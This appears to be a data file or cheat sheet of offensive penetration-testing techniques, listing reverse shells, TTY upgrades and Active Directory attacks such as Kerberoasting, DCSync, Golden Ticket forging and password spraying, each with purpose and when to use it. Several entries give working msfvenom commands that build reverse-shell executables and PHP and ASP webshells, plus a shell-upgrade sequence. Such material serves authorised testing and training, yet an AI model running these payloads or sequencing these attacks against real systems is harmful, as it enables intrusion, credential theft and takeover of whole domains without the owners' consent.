techniques.name: Netcat Listener
techniques.purpose: Catch incoming reverse shell
techniques.when_to_use: Before triggering reverse shell payload

techniques.name: Bash Reverse Shell
techniques.purpose: Send reverse shell from Linux target
techniques.when_to_use: When bash is available on target

techniques.name: Python3 Reverse Shell
techniques.purpose: Reverse shell via Python3
techniques.when_to_use: When Python3 is available on target

techniques.name: PowerShell Reverse Shell
techniques.purpose: Reverse shell from Windows
techniques.when_to_use: When PowerShell is available on Windows target

techniques.name: msfvenom Windows x64 EXE
techniques.purpose: Generate Windows reverse shell payload
techniques.when_to_use: When you can execute a binary on Windows
techniques.command: msfvenom -p windows/x64/shell_reverse_tcp LHOST={TARGET_IP} LPORT=4444 -f exe -o shell.exe

techniques.name: msfvenom PHP Webshell
techniques.purpose: Generate PHP reverse shell payload
techniques.when_to_use: When you can upload PHP files
techniques.command: msfvenom -p php/reverse_php LHOST={TARGET_IP} LPORT=4444 -f raw -o shell.php

techniques.name: msfvenom Linux ELF
techniques.purpose: Generate Linux reverse shell binary
techniques.when_to_use: When you can execute binaries on Linux
techniques.command: msfvenom -p linux/x64/shell_reverse_tcp LHOST={TARGET_IP} LPORT=4444 -f elf -o shell.elf && chmod +x shell.elf

techniques.name: msfvenom ASP Webshell
techniques.purpose: Generate ASP reverse shell for IIS
techniques.when_to_use: When you can upload to IIS server
techniques.command: msfvenom -p windows/shell_reverse_tcp LHOST={TARGET_IP} LPORT=4444 -f asp -o shell.asp

techniques.name: Upgrade Shell to TTY
techniques.purpose: Get fully interactive shell
techniques.when_to_use: After catching a basic reverse shell

techniques.name: Full TTY Upgrade (stty)
techniques.purpose: Get fully interactive shell with Ctrl+C support
techniques.when_to_use: After python pty spawn
techniques.command:
# In reverse shell: python3 -c 'import pty;pty.spawn("/bin/bash")'
# Press Ctrl+Z, then in local terminal:
stty raw -echo; fg
# Then in shell:
export TERM=xterm; stty rows 40 cols 200

techniques.name: Evil-WinRM Shell
techniques.purpose: Get PowerShell shell via WinRM
techniques.when_to_use: When WinRM (5985) is open and you have credentials

techniques.name: Evil-WinRM with Hash
techniques.purpose: WinRM shell using NTLM hash
techniques.when_to_use: When you have NTLM hash

techniques.name: BloodHound Collection (SharpHound)
techniques.purpose: Map AD attack paths and relationships
techniques.when_to_use: After getting domain user credentials

techniques.name: BloodHound Python (Remote)
techniques.purpose: Collect AD data without uploading to target
techniques.when_to_use: When you have domain creds and network access

techniques.name: Kerberoasting
techniques.purpose: Request TGS tickets for offline cracking
techniques.when_to_use: When you have any domain user account

techniques.name: ASREPRoasting
techniques.purpose: Get hashes for users without pre-auth required
techniques.when_to_use: When you have a user list but no passwords

techniques.name: DCSync Attack
techniques.purpose: Dump all domain hashes as if you were a DC
techniques.when_to_use: When you have DCSync rights (Domain Admin or delegated)

techniques.name: Pass-the-Ticket (Impacket)
techniques.purpose: Use Kerberos ticket for lateral movement
techniques.when_to_use: After extracting a TGT/TGS ticket

techniques.name: Enumerate AD Users (CME)
techniques.purpose: List all domain users
techniques.when_to_use: With valid domain credentials

techniques.name: Find Domain Admins
techniques.purpose: List members of Domain Admins group
techniques.when_to_use: After getting domain user access

techniques.name: Golden Ticket Attack
techniques.purpose: Forge Kerberos TGT for any user (persistence)
techniques.when_to_use: After obtaining KRBTGT hash

techniques.name: ACL Abuse - GenericAll
techniques.purpose: Exploit GenericAll permission to reset password
techniques.when_to_use: When BloodHound shows GenericAll on a user

techniques.name: LDAP Password Spray
techniques.purpose: Spray password against all AD users
techniques.when_to_use: When you have a user list and a candidate password
